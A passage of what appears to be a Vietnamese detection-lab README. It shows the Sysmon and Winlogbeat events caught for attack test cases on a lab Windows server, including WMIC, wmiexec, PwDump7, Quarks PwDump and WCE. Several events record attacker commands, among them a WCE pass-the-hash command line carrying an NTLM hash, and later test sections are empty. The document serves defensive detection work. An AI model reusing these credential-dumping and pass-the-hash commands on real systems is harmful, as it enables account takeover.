                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "Process Create:\nRuleName: \nUtcTime: 2020-07-28 05:20:13.946\nProcessGuid: {F4BE2742-B58D-5F1F-0000-00109EC71900}\nProcessId: 3164\nImage: C:\\Windows\\System32\\winrshost.exe\nFileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)\nDescription: Host Process for WinRM's Remote Shell plugin\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: winrshost.exe\nCommandLine: C:\\Windows\\system32\\WinrsHost.exe -Embedding\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WINSRV2008\\Administrator\nLogonGuid: {F4BE2742-B58D-5F1F-0000-0020EEC41900}\nLogonId: 0x19c4ee\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=2A95058431853AF672D1E8EF518BF69C,SHA256=6D8B34A3FD8E9EE61279FDFCDE0C3F13071F84EDDAA7B385E3C859343BF4703A,IMPHASH=6101500E8BA15704009132321204BEA0\nParentProcessGuid: {F4BE2742-8E73-5F1F-0000-00108BEB0000}\nParentProcessId: 724\nParentImage: C:\\Windows\\System32\\svchost.exe\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
        "process": {
            "args": [
                "C:\\Windows\\system32\\WinrsHost.exe",
                "-Embedding"
            ],
            "entity_id": "{F4BE2742-B58D-5F1F-0000-00109EC71900}",
            "executable": "C:\\Windows\\System32\\winrshost.exe",
            "name": "winrshost.exe",
            "parent": {
                "args": [
                    "C:\\Windows\\system32\\svchost.exe",
                    "-k",
                    "DcomLaunch"
                ],
                "entity_id": "{F4BE2742-8E73-5F1F-0000-00108BEB0000}",
                "executable": "C:\\Windows\\System32\\svchost.exe",
                "name": "svchost.exe",
                "pid": 724
            },
            "pid": 3164,
            "working_directory": "C:\\Windows\\system32\\"
        },
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "user": {
            "domain": "WINSRV2008",
            "name": "Administrator"
        },
        "winlog": {
            "api": "wineventlog",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "Company": "Microsoft Corporation",
                "Description": "Host Process for WinRM's Remote Shell plugin",
                "FileVersion": "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                "IntegrityLevel": "High",
                "LogonGuid": "{F4BE2742-B58D-5F1F-0000-0020EEC41900}",
                "LogonId": "0x19c4ee",
                "OriginalFileName": "winrshost.exe",
                "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                "TerminalSessionId": "0"
            },
            "event_id": 1,
            "opcode": "Info",
            "process": {
                "pid": 2100,
                "thread": {
                    "id": 2752
                }
            },
            "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": 49538,
            "task": "Process Create (rule: ProcessCreate)",
            "user": {
                "domain": "NT AUTHORITY",
                "identifier": "S-1-5-18",
                "name": "SYSTEM",
                "type": "User"
            },
            "version": 5
        }
    },
    "_type": "_doc",
    "sort": [
        1595913613946
    ]
}
```


## Test case 5: WMIC
![Test case 5: WMIC](/Images/testcase5_wmic.png)

```
Phat hien su tan cong cua Test case 5 WMIC
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 5 WMIC
-----------------------------------------------------------------------------------
{
    "_id": "WdE6mXMB69Q60KPYjbh2",
    "_index": "winlogbeat-7.7.0-2020.07.29",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-29T06:20:15.675Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "adb5a8b9-dc53-4a4c-bc29-7b868adc6a32",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "Process Create (rule: ProcessCreate)",
            "category": "process",
            "code": 1,
            "created": "2020-07-29T06:20:16.921Z",
            "kind": "event",
            "module": "sysmon",
            "provider": "Microsoft-Windows-Sysmon",
            "type": "process_start"
        },
        "hash": {
            "imphash": "d0058544e4588b1b2290b7f4d830eb0a",
            "md5": "5746bd7e255dd6a8afa06f7c42c1ba41",
            "sha256": "db06c3534964e3fc79d2763144ba53742d7fa250ca336f4a0fe724b75aaff386"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "Process Create:\nRuleName: \nUtcTime: 2020-07-29 06:20:15.675\nProcessGuid: {F4BE2742-151F-5F21-0000-0010A7DD1100}\nProcessId: 1884\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd.exe /c calc\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WINSRV2008\\Administrator\nLogonGuid: {F4BE2742-151F-5F21-0000-0020BDDC1100}\nLogonId: 0x11dcbd\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A\nParentProcessGuid: {F4BE2742-F266-5F20-0000-001054EA0200}\nParentProcessId: 3108\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
        "process": {
            "args": [
                "cmd.exe",
                "/c",
                "calc"
            ],
            "entity_id": "{F4BE2742-151F-5F21-0000-0010A7DD1100}",
            "executable": "C:\\Windows\\System32\\cmd.exe",
            "name": "cmd.exe",
            "parent": {
                "args": [
                    "C:\\Windows\\system32\\wbem\\wmiprvse.exe",
                    "-secured",
                    "-Embedding"
                ],
                "entity_id": "{F4BE2742-F266-5F20-0000-001054EA0200}",
                "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
                "name": "WmiPrvSE.exe",
                "pid": 3108
            },
            "pid": 1884,
            "working_directory": "C:\\Windows\\system32\\"
        },
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "user": {
            "domain": "WINSRV2008",
            "name": "Administrator"
        },
        "winlog": {
            "api": "wineventlog",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "Company": "Microsoft Corporation",
                "Description": "Windows Command Processor",
                "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
                "IntegrityLevel": "High",
                "LogonGuid": "{F4BE2742-151F-5F21-0000-0020BDDC1100}",
                "LogonId": "0x11dcbd",
                "OriginalFileName": "Cmd.Exe",
                "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                "TerminalSessionId": "0"
            },
            "event_id": 1,
            "opcode": "Info",
            "process": {
                "pid": 2232,
                "thread": {
                    "id": 3036
                }
            },
            "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": 50792,
            "task": "Process Create (rule: ProcessCreate)",
            "user": {
                "domain": "NT AUTHORITY",
                "identifier": "S-1-5-18",
                "name": "SYSTEM",
                "type": "User"
            },
            "version": 5
        }
    },
    "_type": "_doc",
    "sort": [
        1596003615675
    ]
}
```

## Test case 6: wmiexec.vbs
![Test case 6: wmiexec.vbs](/Images/testcase6_wmiexec_vbs.png)
```
Phat hien su tan cong cua Test case 6 vmiexec.vbs
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 6 vmiexec.vbs
-----------------------------------------------------------------------------------
{
    "_id": "MijzmXMB71qd4Oo4WSSD",
    "_index": "winlogbeat-7.7.0-2020.07.29",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-29T09:42:07.096Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "361d7753-a939-49a9-9687-6c1427f5917f",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "Process Create (rule: ProcessCreate)",
            "category": "process",
            "code": 1,
            "created": "2020-07-29T09:42:08.346Z",
            "kind": "event",
            "module": "sysmon",
            "provider": "Microsoft-Windows-Sysmon",
            "type": "process_start"
        },
        "hash": {
            "imphash": "d0058544e4588b1b2290b7f4d830eb0a",
            "md5": "5746bd7e255dd6a8afa06f7c42c1ba41",
            "sha256": "db06c3534964e3fc79d2763144ba53742d7fa250ca336f4a0fe724b75aaff386"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "Process Create:\nRuleName: \nUtcTime: 2020-07-29 09:42:07.096\nProcessGuid: {F4BE2742-446F-5F21-0000-00101F033300}\nProcessId: 1216\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd.exe /c del C:\\windows\\temp\\wmi.dll /F > nul 2>&1\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WINSRV2008\\Administrator\nLogonGuid: {F4BE2742-446F-5F21-0000-002035023300}\nLogonId: 0x330235\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A\nParentProcessGuid: {F4BE2742-2A30-5F21-0000-00102FCB0200}\nParentProcessId: 3012\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
        "process": {
            "args": [
                "cmd.exe",
                "/c",
                "del",
                "C:\\windows\\temp\\wmi.dll",
                "/F",
                ">",
                "nul",
                "2>&1"
            ],
            "entity_id": "{F4BE2742-446F-5F21-0000-00101F033300}",
            "executable": "C:\\Windows\\System32\\cmd.exe",
            "name": "cmd.exe",
            "parent": {
                "args": [
                    "C:\\Windows\\system32\\wbem\\wmiprvse.exe",
                    "-secured",
                    "-Embedding"
                ],
                "entity_id": "{F4BE2742-2A30-5F21-0000-00102FCB0200}",
                "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
                "name": "WmiPrvSE.exe",
                "pid": 3012
            },
            "pid": 1216,
            "working_directory": "C:\\Windows\\system32\\"
        },
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "user": {
            "domain": "WINSRV2008",
            "name": "Administrator"
        },
        "winlog": {
            "api": "wineventlog",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "Company": "Microsoft Corporation",
                "Description": "Windows Command Processor",
                "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
                "IntegrityLevel": "High",
                "LogonGuid": "{F4BE2742-446F-5F21-0000-002035023300}",
                "LogonId": "0x330235",
                "OriginalFileName": "Cmd.Exe",
                "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                "TerminalSessionId": "0"
            },
            "event_id": 1,
            "opcode": "Info",
            "process": {
                "pid": 2112,
                "thread": {
                    "id": 2816
                }
            },
            "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": 50944,
            "task": "Process Create (rule: ProcessCreate)",
            "user": {
                "domain": "NT AUTHORITY",
                "identifier": "S-1-5-18",
                "name": "SYSTEM",
                "type": "User"
            },
            "version": 5
        }
    },
    "_type": "_doc",
    "sort": [
        1596015727096
    ]
}
```

## Test case 7: PwDump 7
![Test case 7: PwDump 7](/Images/testcase7_pwdump7.png)
```
Phat hien su tan cong cua Test case 7 PWDump7
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 7 PWDump7
-----------------------------------------------------------------------------------
{
    "_id": "tCgEmnMB71qd4Oo4rmd9",
    "_index": "winlogbeat-7.7.0-2020.07.29",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-29T10:01:03.647Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "361d7753-a939-49a9-9687-6c1427f5917f",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "File System",
            "code": 4663,
            "created": "2020-07-29T10:01:04.724Z",
            "kind": "event",
            "provider": "Microsoft-Windows-Security-Auditing"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "An attempt was made to access an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4220747943-3152432350-320651364-1000\n\tAccount Name:\t\tsv\n\tAccount Domain:\t\tWINSRV2008\n\tLogon ID:\t\t0x75c4f\n\nObject:\n\tObject Server:\tSecurity\n\tObject Type:\tFile\n\tObject Name:\tF:\\HackingFolder\\PwDump7\\libeay32.dll\n\tHandle ID:\t0x2c\n\nProcess Information:\n\tProcess ID:\t0x164\n\tProcess Name:\tF:\\HackingFolder\\PwDump7\\PwDump7.exe\n\nAccess Request Information:\n\tAccesses:\tExecute/Traverse\n\t\t\t\t\n\tAccess Mask:\t0x20",
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "Security",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "AccessList": "%%4421\n\t\t\t\t",
                "AccessMask": "0x20",
                "HandleId": "0x2c",
                "ObjectName": "F:\\HackingFolder\\PwDump7\\libeay32.dll",
                "ObjectServer": "Security",
                "ObjectType": "File",
                "ProcessId": "0x164",
                "ProcessName": "F:\\HackingFolder\\PwDump7\\PwDump7.exe",
                "SubjectDomainName": "WINSRV2008",
                "SubjectLogonId": "0x75c4f",
                "SubjectUserName": "sv",
                "SubjectUserSid": "S-1-5-21-4220747943-3152432350-320651364-1000"
            },
            "event_id": 4663,
            "keywords": [
                "Audit Success"
            ],
            "opcode": "Info",
            "process": {
                "pid": 4,
                "thread": {
                    "id": 68
                }
            },
            "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
            "provider_name": "Microsoft-Windows-Security-Auditing",
            "record_id": 2090038,
            "task": "File System"
        }
    },
    "_type": "_doc",
    "sort": [
        1596016863647
    ]
}
```


## Test case 8: Quarks Pwdump
![Test case 8: Quarks Pwdump](/Images/testcase8_quarkspwdump.png)
```
Phat hien su tan cong cua Test case 8 Quarks PwDump
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 8 Quarks PwDump
-----------------------------------------------------------------------------------
{
    "_id": "w3mlknMBQGGqkhfepkRK",
    "_index": "winlogbeat-7.7.0-2020.07.28",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-28T08:37:29.693Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "d4fb884b-fb62-4938-9918-463239b8cc5d",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "File created (rule: FileCreate)",
            "code": 11,
            "created": "2020-07-28T08:37:30.619Z",
            "kind": "event",
            "module": "sysmon",
            "provider": "Microsoft-Windows-Sysmon"
        },
        "file": {
            "path": "C:\\Users\\sv\\AppData\\Local\\Temp\\SAM-19593444.dmp"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "File created:\nRuleName: \nUtcTime: 2020-07-28 08:37:29.693\nProcessGuid: {F4BE2742-E3C9-5F1F-0000-0010B6913800}\nProcessId: 5216\nImage: F:\\HackingFolder\\QuarksPwDump.exe\nTargetFilename: C:\\Users\\sv\\AppData\\Local\\Temp\\SAM-19593444.dmp\nCreationUtcTime: 2020-07-28 08:37:29.693",
        "process": {
            "entity_id": "{F4BE2742-E3C9-5F1F-0000-0010B6913800}",
            "executable": "F:\\HackingFolder\\QuarksPwDump.exe",
            "name": "QuarksPwDump.exe",
            "pid": 5216
        },
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "CreationUtcTime": "2020-07-28 08:37:29.693"
            },
            "event_id": 11,
            "opcode": "Info",
            "process": {
                "pid": 2100,
                "thread": {
                    "id": 2752
                }
            },
            "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": 49681,
            "task": "File created (rule: FileCreate)",
            "user": {
                "domain": "NT AUTHORITY",
                "identifier": "S-1-5-18",
                "name": "SYSTEM",
                "type": "User"
            },
            "version": 2
        }
    },
    "_type": "_doc",
    "sort": [
        1595925449693
    ]
}
```


## Test case 9: WCE Password and hash dump
![Test case 8: WCE Password and hash dump](/Images/testcase9_password_and_hash_dump.png)
```
Phat hien su tan cong cua Test case 9 WCE - Password and Hash Dump
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 9 WCE - Password and Hash Dump
-----------------------------------------------------------------------------------
{
    "_id": "VHc2knMBQGGqkhfeoZze",
    "_index": "winlogbeat-7.7.0-2020.07.28",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-28T06:07:53.167Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "d4fb884b-fb62-4938-9918-463239b8cc5d",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "File created (rule: FileCreate)",
            "code": 11,
            "created": "2020-07-28T06:07:55.907Z",
            "kind": "event",
            "module": "sysmon",
            "provider": "Microsoft-Windows-Sysmon"
        },
        "file": {
            "path": "C:\\Windows\\Temp\\wceaux.dll"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "File created:\nRuleName: DLL\nUtcTime: 2020-07-28 06:07:53.167\nProcessGuid: {F4BE2742-C0B9-5F1F-0000-00106A402200}\nProcessId: 5000\nImage: F:\\HackingFolder\\wce64.exe\nTargetFilename: C:\\Windows\\Temp\\wceaux.dll\nCreationUtcTime: 2020-07-28 06:07:53.167",
        "process": {
            "entity_id": "{F4BE2742-C0B9-5F1F-0000-00106A402200}",
            "executable": "F:\\HackingFolder\\wce64.exe",
            "name": "wce64.exe",
            "pid": 5000
        },
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "CreationUtcTime": "2020-07-28 06:07:53.167",
                "RuleName": "DLL"
            },
            "event_id": 11,
            "opcode": "Info",
            "process": {
                "pid": 2100,
                "thread": {
                    "id": 2752
                }
            },
            "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": 49595,
            "task": "File created (rule: FileCreate)",
            "user": {
                "domain": "NT AUTHORITY",
                "identifier": "S-1-5-18",
                "name": "SYSTEM",
                "type": "User"
            },
            "version": 2
        }
    },
    "_type": "_doc",
    "sort": [
        1595916473167
    ]
}
```

## Test case 10: WCE Remote Login
![Test case 10: WCE Remote Login](/Images/testcase10_remote_login.png)
```
Phat hien su tan cong cua Test case 10 WCE Remote Login
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 10 WCE Remote Login
-----------------------------------------------------------------------------------
{
    "_id": "K9gYoHMBsZ6fp0tU8bq3",
    "_index": "winlogbeat-7.7.0-2020.07.30",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-30T14:20:52.603Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "5d2a63eb-3b0a-49c9-8d41-86af65c2fe40",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "Process Create (rule: ProcessCreate)",
            "category": "process",
            "code": 1,
            "created": "2020-07-30T14:20:53.798Z",
            "kind": "event",
            "module": "sysmon",
            "provider": "Microsoft-Windows-Sysmon",
            "type": "process_start"
        },
        "hash": {
            "imphash": "e96a73c7bf33a464c510ede582318bf2",
            "md5": "ccf1d1573f175299ade01c07791a6541",
            "sha256": "68a15a34c2e28b9b521a240b948634617d72ad619e3950bc6dc769e60a0c3cf2"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "Process Create:\nRuleName: \nUtcTime: 2020-07-30 14:20:52.603\nProcessGuid: {F4BE2742-D744-5F22-0000-00103B5E2A00}\nProcessId: 4256\nImage: F:\\HackingFolder\\wce64.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nOriginalFileName: ?\nCommandLine: wce64.exe  -s Administrator:WINSRV2008:00000000000000000000000000000000:FCF2D6F9C8A83291396A6555F182B8A7\nCurrentDirectory: F:\\HackingFolder\\\nUser: WINSRV2008\\sv\nLogonGuid: {F4BE2742-CA6A-5F22-0000-0020C7861E00}\nLogonId: 0x1e86c7\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=CCF1D1573F175299ADE01C07791A6541,SHA256=68A15A34C2E28B9B521A240B948634617D72AD619E3950BC6DC769E60A0C3CF2,IMPHASH=E96A73C7BF33A464C510EDE582318BF2\nParentProcessGuid: {F4BE2742-CA88-5F22-0000-00107F9C2000}\nParentProcessId: 3640\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ",
        "process": {
            "args": [
                "wce64.exe",
                "-s",
                "Administrator:WINSRV2008:00000000000000000000000000000000:FCF2D6F9C8A83291396A6555F182B8A7"
            ],
            "entity_id": "{F4BE2742-D744-5F22-0000-00103B5E2A00}",
            "executable": "F:\\HackingFolder\\wce64.exe",
            "name": "wce64.exe",
            "parent": {
                "args": [
                    "C:\\Windows\\system32\\cmd.exe"
                ],
                "entity_id": "{F4BE2742-CA88-5F22-0000-00107F9C2000}",
                "executable": "C:\\Windows\\System32\\cmd.exe",
                "name": "cmd.exe",
                "pid": 3640
            },
            "pid": 4256,
            "working_directory": "F:\\HackingFolder\\"
        },
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "user": {
            "domain": "WINSRV2008",
            "name": "sv"
        },
        "winlog": {
            "api": "wineventlog",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "Company": "?",
                "Description": "?",
                "FileVersion": "?",
                "IntegrityLevel": "High",
                "LogonGuid": "{F4BE2742-CA6A-5F22-0000-0020C7861E00}",
                "LogonId": "0x1e86c7",
                "OriginalFileName": "?",
                "Product": "?",
                "TerminalSessionId": "1"
            },
            "event_id": 1,
            "opcode": "Info",
            "process": {
                "pid": 2264,
                "thread": {
                    "id": 2832
                }
            },
            "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": 68419,
            "task": "Process Create (rule: ProcessCreate)",
            "user": {
                "domain": "NT AUTHORITY",
                "identifier": "S-1-5-18",
                "name": "SYSTEM",
                "type": "User"
            },
            "version": 5
        }
    },
    "_type": "_doc",
    "sort": [
        1596118852603
    ]
}
```

## Test case 11: Golden Ticket
![Test case 11: Golden Ticket](/Images/testcase11_golden_ticket.png)
```
```

## Test case 12: AT Command
![Test case 12: AT Command](/Images/testcase12_at_command.png)
```
```

## Test case 13: RDP
![Test case 13: RDP](/Images/testcase13_rdp.png)
```
```

## Test case 14: Mimikatz
![Test case 14: Mimikatz](/Images/testcase14_mimikatz.png)
```
```

## Test case 15: Bypass UAC
![Test case 15: Bypass UAC](/Images/testcase15_bypassuac.png)
```
```

## Test case 16: ntdsutil
![Test case 16: ntdsutil](/Images/testcase)
```
```

## Test case 16: ntdsutil
![Test case 16: ntdsutil](/Images/testcase)
```
```

## Test case 18: net user
![Test case 18: net user](/Images/testcase)
```
```

## Test case 19: csvde
![Test case 19: csvde](/Images/testcase)
```
```

## Test case 20: ldifde
![Test case 20: ldifde](/Images/testcase)
```
```

## Test case 21: Timestomp
![Test case 21: Timestomp](/Images/testcase)
```
```

## Test case 22: wevtutil
![Test case 22: wevtutil](/Images/testcase)
```
```
